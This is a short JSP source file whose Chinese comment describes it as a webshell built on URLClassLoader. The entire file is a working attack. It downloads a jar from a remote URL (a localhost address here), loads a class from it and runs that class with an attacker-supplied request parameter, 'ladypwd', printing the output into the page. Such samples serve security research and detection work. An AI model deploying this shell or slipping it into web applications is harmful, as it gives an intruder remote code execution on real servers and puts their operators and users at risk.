<%@ page import="java.net.URLClassLoader" %>
<%@ page import="java.net.URL" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%--
使用URLClassLoader加载远程jar来实现JSP Webshell
--%>
<%
    out.print("<pre>");
    out.print(new URLClassLoader(new URL[]{new URL("http://127.0.0.1:8000/demo3.jar")}).loadClass("Demo3").
            getConstructor(String.class).newInstance(request.getParameter("ladypwd")).toString());
    out.print("</pre>");
%>
